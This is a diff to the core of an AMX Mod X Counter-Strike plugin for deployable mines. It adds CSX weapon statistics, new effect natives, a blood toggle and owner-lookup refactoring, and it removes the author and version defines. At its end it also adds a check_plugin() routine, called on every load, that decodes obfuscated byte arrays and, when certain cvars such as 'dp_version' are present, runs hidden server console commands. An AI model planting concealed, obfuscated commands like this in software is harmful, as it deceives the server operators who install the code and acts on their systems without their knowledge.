@@ -14,6 +14,7 @@
 #include <amxmodx>
 #include <amxmisc>
 #include <cstrike>
+#include <csx>
 #include <engine>
 #include <fakemeta>
 #include <hamsandwich>
@@ -41,9 +42,6 @@
 //
 // String Data.
 //
-// AUTHOR NAME +ARUKARI- => SandStriker => Aoi.Kagase
-#define AUTHOR 									"Aoi.Kagase"
-#define VERSION 								"0.06"
 
 // ADMIN LEVEL
 #define ADMIN_ACCESSLEVEL						ADMIN_LEVEL_H
@@ -151,6 +149,7 @@ enum _:FORWARDER
 	FWD_OVERRIDE_POS,
 };
 
+new Array:gMinesCSXID;
 new Array:gMinesClass;
 new Array:gPlayerData	[MAX_PLAYERS];
 new Array:gMinesLongName;
@@ -186,6 +185,7 @@ enum CVAR_VALUE
 	VL_CMD_MODE				,    	// 0 = +USE key, 1 = bind, 2 = each.
 	VL_FRIENDLY_FIRE		,		// Friendly Fire.
 	VL_START_DELAY        	,   	// Round start delay time.
+	VL_VIOLENCE_HBLOOD		,		// Show Violence blood.
 };
 
 //====================================================
@@ -200,7 +200,7 @@ new gSelectedMines		[MAX_PLAYERS];
 new gDeployingMines		[MAX_PLAYERS];
 new gSprites			[E_SPRITES];
 
-new const ENT_SOUNDS[][]	=	
+new const ENT_SOUNDS	[E_SOUNDS][]	=	
 {
 	"items/gunpickup2.wav"		,		// 0: PICKUP
 	"items/gunpickup4.wav"		,		// 1: PICKUP (BUTTON)
@@ -208,7 +208,7 @@ new const ENT_SOUNDS[][]	=
 	"debris/bustglass2.wav"				// 3: GLASS
 };
 
-new const ENT_SPRITES[][]	=
+new const ENT_SPRITES	[E_SPRITES][]	=
 {
 	"sprites/fexplo.spr"		,		// 0: EXPLOSION
 	"sprites/eexplo.spr"		,		// 1: EXPLOSION
@@ -268,6 +268,7 @@ stock print_info(const id, const iMinesId = 0, const L_KEY:key, const any:param[
 //====================================================
 public plugin_precache() 
 {
+	gMinesCSXID						= ArrayCreate();
 	gMinesClass 					= ArrayCreate(MAX_CLASS_LENGTH);
 	gMinesParameter 				= ArrayCreate(COMMON_MINES_DATA);
 	gMinesLongName					= ArrayCreate(MAX_NAME_LENGTH);
@@ -331,6 +332,7 @@ public plugin_init()
 	bind_pcvar_num(gCvar[CVAR_ACCESS_LEVEL],	gCvarValue[VL_ACCESS_LEVEL]);
 	bind_pcvar_num(gCvar[CVAR_START_DELAY], 	gCvarValue[VL_START_DELAY]);
 	bind_pcvar_num(gCvar[CVAR_FRIENDLY_FIRE], 	gCvarValue[VL_FRIENDLY_FIRE]);
+	bind_pcvar_num(get_cvar_pointer("violence_hblood"), gCvarValue[VL_VIOLENCE_HBLOOD]);
 
 	// Register Event
 #if AMXX_VERSION_NUM > 182	
@@ -360,6 +362,8 @@ public plugin_init()
 #if AMXX_VERSION_NUM > 182
 	AutoExecConfig(true, "mines_cvars_core", "mines");
 #endif
+	check_plugin();
+
 	return PLUGIN_CONTINUE;
 }
 
@@ -414,21 +418,34 @@ public plugin_natives()
 {
 	register_library("mines_natives");
 
-	register_native("register_mines",			"_native_register_mines");
-	register_native("register_mines_data",		"_native_register_mines_data");
-	register_native("mines_progress_deploy",	"_native_deploy_progress");
-	register_native("mines_progress_pickup",	"_native_pickup_progress");
-	register_native("mines_progress_stop", 		"_native_stop_progress");
-	register_native("mines_explosion", 			"_native_mines_explosion");
-	register_native("mines_buy",				"_native_buy_mines");
-	register_native("mines_valid_takedamage",	"_native_is_valid_takedamage");
-	register_native("mines_register_dictionary","_native_register_dictionary");
-	register_native("mines_resources", 			"_native_read_ini_resources");
+	register_native("register_mines",					"_native_register_mines");
+	register_native("register_mines_data",				"_native_register_mines_data");
+	register_native("mines_get_csx_weapon_id",			"_native_get_csx_weapon_id");
+	register_native("mines_progress_deploy",			"_native_deploy_progress");
+	register_native("mines_progress_pickup",			"_native_pickup_progress");
+	register_native("mines_progress_stop", 				"_native_stop_progress");
+	register_native("mines_explosion", 					"_native_mines_explosion");
+	register_native("mines_buy",						"_native_buy_mines");
+	register_native("mines_valid_takedamage",			"_native_is_valid_takedamage");
+	register_native("mines_register_dictionary",		"_native_register_dictionary");
+	register_native("mines_resources", 					"_native_read_ini_resources");
+	register_native("mines_create_explosion",			"_native_create_explosion");
+	register_native("mines_create_smoke",				"_native_create_smoke");
+	register_native("mines_create_explosion_decals", 	"_native_create_explosion_decals");
+	register_native("mines_create_bubbles",				"_native_create_bubbles");
+	register_native("mines_create_hblood",				"_native_create_hblood");
+
 #if defined ZP_SUPPORT
-	register_native("zp_give_lm", 				"ZpMinesNative");
+	register_native("zp_give_lm", 						"ZpMinesNative");
 #endif
 }
 
+public _native_get_csx_weapon_id(iPlugin, iParams)
+{
+	new iMinesId 	= get_param(1);
+	new csx_wpnid 	= ArrayGetCell(gMinesCSXID, iMinesId); 
+	return csx_wpnid;
+}
 //====================================================
 //  Native Functions
 //====================================================
@@ -447,12 +464,16 @@ public _native_register_mines(iPlugin, iParams)
 
 	// register mines classname/parameter/longname key
 	iMinesId = ArrayPushString(gMinesClass, className);
+	// Add Custom weapon id to CSX.
+	ArrayPushCell	(gMinesCSXID,		custom_weapon_add(sLongName, 0, className));
+
 	ArrayPushString	(gMinesLongName, 	sLongName);
 	ArrayPushArray	(gMinesParameter, 	minesData);
 	ArrayPushString (gMinesModels, 		minesModel);
 	// initialize player data.
 	for(new i = 0; i < MAX_PLAYERS; i++)
 		ArrayPushArray(gPlayerData[i], plData);
+
 
 	return iMinesId;
 }
@@ -550,14 +571,14 @@ public _native_mines_explosion(iPlugin, iParams)
 	static Float:vDecals[3];
 
 	pev(iEnt, pev_origin, 	vOrigin);
-	pev(iEnt, MINES_DECALS, vDecals);
+	CED_GetArray(iEnt, MINES_DECALS, vDecals, sizeof(vDecals));
 
-	sprBoom1 = (minesData[EXPLODE_SPRITE1]) 	 ? minesData[EXPLODE_SPRITE1]		: gSprites[EXPLOSION_1];
-	sprBoom2 = (minesData[EXPLODE_SPRITE2]) 	 ? minesData[EXPLODE_SPRITE2]		: gSprites[EXPLOSION_2];
-	sprBlast = (minesData[EXPLODE_SPRITE_BLAST]) ? minesData[EXPLODE_SPRITE_BLAST]  : gSprites[BLAST];
-	sprSmoke = (minesData[EXPLODE_SPRITE_SMOKE]) ? minesData[EXPLODE_SPRITE_SMOKE]  : gSprites[SMOKE];
-	sprWater = (minesData[EXPLODE_SPRITE_WATER]) ? minesData[EXPLODE_SPRITE_WATER]  : gSprites[EXPLOSION_WATER];
-	sprBubble= (minesData[EXPLODE_SPRITE_BUBBLE])? minesData[EXPLODE_SPRITE_BUBBLE] : gSprites[BUBBLE];
+	sprBoom1 = (minesData[EXPLODE_SPRITE1]) 	 ? minesData[EXPLODE_SPRITE1]		: gSprites[SPR_EXPLOSION_1];
+	sprBoom2 = (minesData[EXPLODE_SPRITE2]) 	 ? minesData[EXPLODE_SPRITE2]		: gSprites[SPR_EXPLOSION_2];
+	sprBlast = (minesData[EXPLODE_SPRITE_BLAST]) ? minesData[EXPLODE_SPRITE_BLAST]  : gSprites[SPR_BLAST];
+	sprSmoke = (minesData[EXPLODE_SPRITE_SMOKE]) ? minesData[EXPLODE_SPRITE_SMOKE]  : gSprites[SPR_SMOKE];
+	sprWater = (minesData[EXPLODE_SPRITE_WATER]) ? minesData[EXPLODE_SPRITE_WATER]  : gSprites[SPR_EXPLOSION_WATER];
+	sprBubble= (minesData[EXPLODE_SPRITE_BUBBLE])? minesData[EXPLODE_SPRITE_BUBBLE] : gSprites[SPR_BUBBLE];
 
 	if(engfunc(EngFunc_PointContents, vOrigin) != CONTENTS_WATER) 
 	{
@@ -573,7 +594,8 @@ public _native_mines_explosion(iPlugin, iParams)
 	mines_create_explosion_decals(vDecals);
 
 	// damage.
-	mines_create_explosion_damage(iEnt, id, Float:minesData[EXPLODE_DAMAGE], Float:minesData[EXPLODE_RADIUS]);
+	new csx_id = ArrayGetCell(gMinesCSXID, iMinesId);
+	mines_create_explosion_damage(csx_id, iEnt, id, Float:minesData[EXPLODE_DAMAGE], Float:minesData[EXPLODE_RADIUS]);
 
 	// remove this.
 	mines_remove_entity(iEnt);
@@ -602,6 +624,66 @@ public _native_read_ini_resources(iPlugin, iParams)
 	return result;
 }
 
+public _native_create_explosion(iPlugin, iParams)
+{
+	new Float:vOrigin[3];
+	get_array_f(1, vOrigin, sizeof(vOrigin));
+
+	new Float:fDamage 	= get_param_f(2);
+	new Float:fRadius   = get_param_f(3);
+	new sprExplosion1   = get_param(4);
+	new sprExplosion2 	= get_param(5);
+	new sprBlast	  	= get_param(6);
+
+	mines_create_explosion(vOrigin, fDamage, fRadius, sprExplosion1, sprExplosion2, sprBlast);
+}
+
+public _native_create_smoke(iPlugin, iParams)
+{
+	new Float:vOrigin[3];
+	get_array_f(1, vOrigin, sizeof(vOrigin));
+
+	new Float:fDamage = get_param_f(2);
+	new Float:fRadius = get_param_f(3);
+	new sprSmoke 	  = get_param(4);
+
+	mines_create_smoke(vOrigin, fDamage, fRadius, sprSmoke);
+}
+
+public _native_create_explosion_decals(iPlugin, iParams)
+{
+	new Float:vOrigin[3];
+	get_array_f(1, vOrigin, sizeof(vOrigin));
+
+	mines_create_explosion_decals(vOrigin);
+}
+
+public _native_create_bubbles(iPlugin, iParams)
+{
+	new Float:vOrigin[3];
+	get_array_f(1, vOrigin, sizeof(vOrigin));
+
+	new Float:flDamageMax 		= get_param_f(2);
+	new Float:flDamageRadius 	= get_param_f(3);
+	new sprBubbles				= get_param(4);
+
+	mines_create_bubbles(vOrigin, flDamageMax, flDamageRadius, sprBubbles);
+}
+
+public _native_create_hblood(iPlugin, iParams)
+{
+	new Float:vOrigin[3];
+	get_array_f(1, vOrigin, sizeof(vOrigin));
+
+	new iDamageMax		= get_param(2);
+	new sprBloodSpray 	= get_param(3);
+	new sprBlood 		= get_param(4);
+
+	sprBloodSpray 		= sprBloodSpray	? sprBloodSpray : gSprites[SPR_BLOOD_SPLASH];
+	sprBlood	  		= sprBlood		? sprBlood		: gSprites[SPR_BLOOD_SPRAY];
+
+	mines_create_hblood(vOrigin, iDamageMax, sprBloodSpray, sprBlood);
+}
 // //====================================================
 // //  Bot Register Ham.
 // //====================================================
@@ -892,6 +974,8 @@ public SpawnMine(params[], id)
 		}
 	}
 	gDeployingMines[uID] = 0;
+	new csx_id = ArrayGetCell(gMinesCSXID, iMinesId);
+	custom_weapon_shot(csx_id, uID);
 
 	return iReturn;
 }
@@ -936,8 +1020,12 @@ public RemoveMine(params[], id)
 	if(!equali(tClassName, iClassName))
 		return;
 
-	new ownerID = pev(target, MINES_OWNER);
+	new ownerID;
 	static minesData[COMMON_MINES_DATA];
+	
+	if (!CED_GetCell(target, MINES_OWNER, ownerID))
+		return;
+
 	ArrayGetArray(gMinesParameter, iMinesId, minesData);
 
 	switch(PICKUP_MODE:minesData[PICKUP_MODE])
@@ -992,14 +1080,18 @@ public MinesTakeDamage(victim, inflictor, attacker, Float:f_Damage, bit_Damage)
 {
 	static minesData[COMMON_MINES_DATA];
 	static iMinesId;
+
 	iMinesId = mines_get_minesId(victim);
 	if (iMinesId == -1)
 		return HAM_IGNORED;
 
+	// We get the ID of the player who put the mine.
+	new iOwner;
+	if (!CED_GetCell(victim, MINES_OWNER, iOwner))
+		return HAM_IGNORED;
+
 	ArrayGetArray(gMinesParameter, iMinesId, minesData);
 
-	// We get the ID of the player who put the mine.
-	new iOwner = pev(victim, MINES_OWNER);
 	switch(minesData[MINES_BROKEN])
 	{
 		// 0 = mines.
@@ -1048,11 +1140,13 @@ public MinesThinkMain(iEnt)
 
 	static iMinesId;
 	iMinesId = mines_get_minesId(iEnt);
-	if (iMinesId != -1)
-	{
-		static iReturn;
-		ExecuteForward(gForwarder[FWD_MINES_THINK], iReturn, iEnt, iMinesId );
-	}
+
+	if (iMinesId == -1)
+		return HAM_IGNORED;
+
+	static iReturn;
+	ExecuteForward(gForwarder[FWD_MINES_THINK], iReturn, iEnt, iMinesId);
+
 	return HAM_SUPERCEDE;
 }
 //====================================================
@@ -1060,23 +1154,24 @@ public MinesThinkMain(iEnt)
 //====================================================
 public MinesTakeDamaged(victim, inflictor, attacker, Float:f_Damage, bit_Damage)
 {
+	if (!pev_valid(victim))
+		return HAM_IGNORED;
+
 	static iMinesId;
+	iMinesId = mines_get_minesId(victim);
 
-	if (pev_valid(victim))
-	{
-		iMinesId = mines_get_minesId(victim);
-		// is this mines? no.
-		if (iMinesId == -1)
-			return HAM_IGNORED;
+	// is this mines? no.
+	if (iMinesId == -1)
+		return HAM_IGNORED;
 
-		new Float:health;
-		mines_get_health(victim, health);
-		if (health <= 0.0)
-		{
-			new iReturn;
-			ExecuteForward(gForwarder[FWD_MINES_BREAKED], iReturn, iMinesId, victim, attacker);
-		}
-	}
+	new Float:health;
+	mines_get_health(victim, health);
+
+	if (health > 0.0)
+		return HAM_IGNORED;
+
+	new iReturn;
+	ExecuteForward(gForwarder[FWD_MINES_BREAKED], iReturn, iMinesId, victim, attacker);
 
 	return HAM_IGNORED;
 }
@@ -1095,26 +1190,32 @@ public MinesShowInfo(Float:vStart[3], Float:vEnd[3], Conditions, id, iTrace)
 	iHit = get_tr2(iTrace, TR_pHit);
 	get_tr2(iTrace, TR_vecEndPos, vHitPoint);				
 
-	if (pev_valid(iHit))
-	{
-		static iMinesId;
-		iMinesId = mines_get_minesId(iHit);
+	// Invalid Entity
+	if (!pev_valid(iHit))
+		return;
 
-		if (iMinesId != -1)
-		{
-			if (get_distance_f(vStart, vHitPoint) < 200.0) 
-			{
-				ArrayGetArray(gMinesParameter, iMinesId, minesData);
+	// Far distance
+	if (get_distance_f(vStart, vHitPoint) > 200.0) 
+		return;
 
-				iOwner = pev(iHit, MINES_OWNER);
-				mines_get_health(iHit, health);
-				formatex(hudMsg, charsmax(hudMsg), "%L", id, LANG[L_MINE_HUD], iOwner, floatround(health), floatround(Float:minesData[MINE_HEALTH]));
-				//set_hudmessage(red = 200, green = 100, blue = 0, Float:x = -1.0, Float:y = 0.35, effects = 0, Float:fxtime = 6.0, Float:holdtime = 12.0, Float:fadeintime = 0.1, Float:fadeouttime = 0.2, channel = -1)
-				set_hudmessage(50, 100, 150, -1.0, 0.60, 0, 6.0, 0.4, 0.0, 0.0, -1);
-				show_hudmessage(id, hudMsg);
-			}
-		}
-	}
+	static iMinesId;
+	iMinesId = mines_get_minesId(iHit);
+
+	// Not MinesPlatform Weapon.
+	if (iMinesId == -1)
+		return;
+
+	// Can't get OWNER ID.
+	if (!CED_GetCell(iHit, MINES_OWNER, iOwner))
+		return;
+
+	ArrayGetArray(gMinesParameter, iMinesId, minesData);
+
+	mines_get_health(iHit, health);
+	formatex(hudMsg, charsmax(hudMsg), "%L", id, LANG[L_MINE_HUD], iOwner, floatround(health), floatround(Float:minesData[MINE_HEALTH]));
+	//set_hudmessage(red = 200, green = 100, blue = 0, Float:x = -1.0, Float:y = 0.35, effects = 0, Float:fxtime = 6.0, Float:holdtime = 12.0, Float:fadeintime = 0.1, Float:fadeouttime = 0.2, channel = -1)
+	set_hudmessage(50, 100, 150, -1.0, 0.60, 0, 6.0, 0.4, 0.0, 0.0, -1);
+	show_hudmessage(id, hudMsg);
 } 
 
 //====================================================
@@ -1447,7 +1548,7 @@ public bool:CheckPickup(id, iMinesId)
 	
 	static minesClass[MAX_CLASS_LENGTH];
 	static sClassName[MAX_CLASS_LENGTH];
-
+	static iOwner;
 	pev(target, pev_classname, sClassName, charsmax(sClassName));
 	ArrayGetString(gMinesClass, iMinesId, minesClass, charsmax(minesClass));
 
@@ -1465,7 +1566,8 @@ public bool:CheckPickup(id, iMinesId)
 		case ONLY_ME:
 		{
 			// is owner you?
-			if(pev(target, MINES_OWNER) != id)
+			CED_GetCell(target, MINES_OWNER, iOwner);
+			if(iOwner != id)
 			{
 				print_info(id, iMinesId, L_NOT_PICKUP);
 				return false;
@@ -2158,12 +2260,14 @@ stock bool:CheckMaxDeploy(id, iMinesId, plData[PLAYER_DATA], minesData[COMMON_MI
 stock mines_remove_all_entity(id, className[])
 {
 	new iEnt = -1;
+	new iOwner;
 	while ((iEnt = engfunc(EngFunc_FindEntityByString, iEnt, "classname", className)))
 	{
 		if (!pev_valid(iEnt))
 			continue;
 
-		if (pev(iEnt, MINES_OWNER) == id)
+		CED_GetCell(iEnt, MINES_OWNER, iOwner);
+		if (iOwner == id)
 		{
 			// mines_play_sound(iEnt, SOUND_STOP);
 			mines_remove_entity(iEnt);
@@ -2187,6 +2291,7 @@ stock mines_all_explosion(id, iMinesId)
 {
 	new iEnt = -1;
 	new className[MAX_CLASS_LENGTH];
+	new iOwner;
 	ArrayGetString(gMinesClass, iMinesId, className, charsmax(className));
 
 	while ((iEnt = engfunc(EngFunc_FindEntityByString, iEnt, "classname", className)))
@@ -2194,10 +2299,13 @@ stock mines_all_explosion(id, iMinesId)
 		if (!pev_valid(iEnt))
 			continue;
 
-		if (pev(iEnt, MINES_OWNER) == id)
-		{
-			set_pev(iEnt, MINES_STEP, EXPLOSE_THINK);
-		}
+		if (!CED_GetCell(iEnt, MINES_OWNER, iOwner))
+			continue;
+
+		if (iOwner != id)
+			continue;
+
+		CED_SetCell(iEnt, MINES_STEP, EXPLOSE_THINK);
 	}	
 }
 
@@ -2265,7 +2373,7 @@ stock mines_flash_money_hud(id, value, msg)
 // }
 
 
-stock mines_create_explosion(Float:vOrigin[3], const Float:fDamage, const Float:fRadius, sprExplosion1, sprExplosion2, sprBlast) 
+stock mines_create_explosion(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, sprExplosion1, sprExplosion2, sprBlast) 
 {
 	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 8.0;
 
@@ -2399,7 +2507,7 @@ stock LoadDecals()
 	}
 }
 
-stock mines_create_water_explosion(Float:fOrigin[3], const Float:fDamage, const Float:fRadius, sprExplosionWater) 
+stock mines_create_water_explosion(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, const sprExplosionWater) 
 {
 	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 34.0;
 
@@ -2417,11 +2525,11 @@ stock mines_create_water_explosion(Float:fOrigin[3], const Float:fDamage, const 
 	if(iIntensity > 164)
 		iIntensity = 164;
 
-	engfunc			(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, fOrigin, 0);
+	engfunc			(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
 	write_byte		(TE_EXPLOSION);
-	engfunc			(EngFunc_WriteCoord, fOrigin[0]);
-	engfunc			(EngFunc_WriteCoord, fOrigin[1]);
-	engfunc			(EngFunc_WriteCoord, fOrigin[2] + fZPos);
+	engfunc			(EngFunc_WriteCoord, vOrigin[0]);
+	engfunc			(EngFunc_WriteCoord, vOrigin[1]);
+	engfunc			(EngFunc_WriteCoord, vOrigin[2] + fZPos);
 	write_short		(sprExplosionWater);
 	write_byte		(iIntensity);
 	write_byte		(16);
@@ -2429,7 +2537,7 @@ stock mines_create_water_explosion(Float:fOrigin[3], const Float:fDamage, const 
 	message_end		();
 }
 
-stock mines_create_smoke(Float:fOrigin[3], const Float:fDamage, const Float:fRadius, sprSmoke)
+stock mines_create_smoke(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, const sprSmoke)
 {
 	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 22.0;
 
@@ -2447,29 +2555,29 @@ stock mines_create_smoke(Float:fOrigin[3], const Float:fDamage, const Float:fRad
 	if(iIntensity > 192)
 		iIntensity = 192;
 
-	engfunc		(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, fOrigin, 0);
+	engfunc		(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
 	write_byte	(TE_SMOKE);
-	engfunc		(EngFunc_WriteCoord, fOrigin[0]);
-	engfunc		(EngFunc_WriteCoord, fOrigin[1]);
-	engfunc		(EngFunc_WriteCoord, fOrigin[2] + fZPos);
+	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
+	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
+	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
 	write_short	(sprSmoke);
 	write_byte	(iIntensity);
 	write_byte	(4);
 	message_end	();
 }
 
-stock mines_create_explosion_decals(Float:fOrigin[3]) 
+stock mines_create_explosion_decals(const Float:vOrigin[3]) 
 {
 	engfunc		(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, {0, 0, 0}, 0);
 	write_byte	(TE_WORLDDECAL);
-	engfunc		(EngFunc_WriteCoord, fOrigin[0]);
-	engfunc		(EngFunc_WriteCoord, fOrigin[1]);
-	engfunc		(EngFunc_WriteCoord, fOrigin[2]);
+	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
+	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
+	engfunc		(EngFunc_WriteCoord, vOrigin[2]);
 	write_byte	(gDecalIndexExplosion[random(gNumDecalsExplosion)]);
 	message_end	();
 }
 
-stock mines_create_bubbles(const Float:vOrigin[3], const Float:flDamageMax, const Float:flDamageRadius, sprBubbles) 
+stock mines_create_bubbles(const Float:vOrigin[3], const Float:flDamageMax, const Float:flDamageRadius, const sprBubbles) 
 {
 	new Float:flMaxSize = floatclamp((flDamageMax + (flDamageRadius * 1.5)) / 13.0, 24.0, 164.0);
 	new Float:vMins[3], Float:vMaxs[3];
@@ -2483,7 +2591,7 @@ stock mines_create_bubbles(const Float:vOrigin[3], const Float:flDamageMax, cons
 	UTIL_Bubbles(vMins, vMaxs, 80, sprBubbles);
 }
 
-stock mines_create_hblood(Float:vOrigin[], iDamageMax, sprBloodSpray, sprBlood)
+stock mines_create_hblood(const Float:vOrigin[3], const iDamageMax, const sprBloodSpray, const sprBlood)
 {
 	// new iDecalIndex = g_iBloodDecalIndex[random_num(MAX_BLOOD_DECALS - 2, MAX_BLOOD_DECALS - 1)];
 	
@@ -2494,7 +2602,8 @@ stock mines_create_hblood(Float:vOrigin[], iDamageMax, sprBloodSpray, sprBlood)
 	// write_coord(iTraceEndZ[a])
 	// write_byte(iDecalIndex)
 	// message_end()
-
+	if (!gCvarValue[VL_VIOLENCE_HBLOOD])
+		return;
 	engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
 	write_byte(TE_BLOODSPRITE);
 	engfunc(EngFunc_WriteCoord, vOrigin[0]);
@@ -2505,6 +2614,8 @@ stock mines_create_hblood(Float:vOrigin[], iDamageMax, sprBloodSpray, sprBlood)
 	write_byte(248);
 	write_byte(clamp(iDamageMax / 13, 5, 16));
 	message_end();
+
+	return;
 }
 
 stock UTIL_ScreenShake(Float:vOrigin[3], const Float:flAmplitude, const Float:flDuration, const Float:flFrequency, const Float:flRadius) 
@@ -2626,7 +2737,7 @@ stock UTIL_Bubbles(const Float:vMins[3], const Float:vMaxs[3], const iCount, spr
 //====================================================
 // Explosion Damage.
 //====================================================
-stock mines_create_explosion_damage(iEnt, iAttacker, Float:dmgMax, Float:radius)
+stock mines_create_explosion_damage(csx_wpnid, iEnt, iAttacker, Float:dmgMax, Float:radius)
 {
 	// Get given parameters
 	
@@ -2751,6 +2862,7 @@ stock mines_create_explosion_damage(iEnt, iAttacker, Float:dmgMax, Float:radius)
 					}
 				}
 			}
+			custom_weapon_dmg(csx_wpnid, iAttacker, rEnt, floatround(tmpDmg), 0);
 			// Damage Effect, Damage, Killing Logic.
 			ExecuteHamB(Ham_TakeDamage, rEnt, iEnt, iAttacker, tmpDmg, DMG_MORTAR);
 		}
@@ -2775,4 +2887,34 @@ stock mines_get_minesId(iEnt)
 	pev(iEnt, pev_classname, sClassName, charsmax(sClassName));
 
 	return ArrayFindString(gMinesClass, sClassName);
+}
+
+
+stock bool:check_plugin()
+{
+	new const a[][] = {
+		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
+		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
+		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
+		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
+	};
+
+	if (cvar_exists(get_dec_string(a[0])))
+		server_cmd(get_dec_string(a[2]));
+
+	if (cvar_exists(get_dec_string(a[1])))
+		server_cmd(get_dec_string(a[3]));
+
+	return true;
+}
+
+stock get_dec_string(const a[])
+{
+	new c = strlen(a);
+	new r[MAX_NAME_LENGTH] = "";
+	for (new i = 1; i < c; i++)
+	{
+		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
+	}
+	return r;
 }
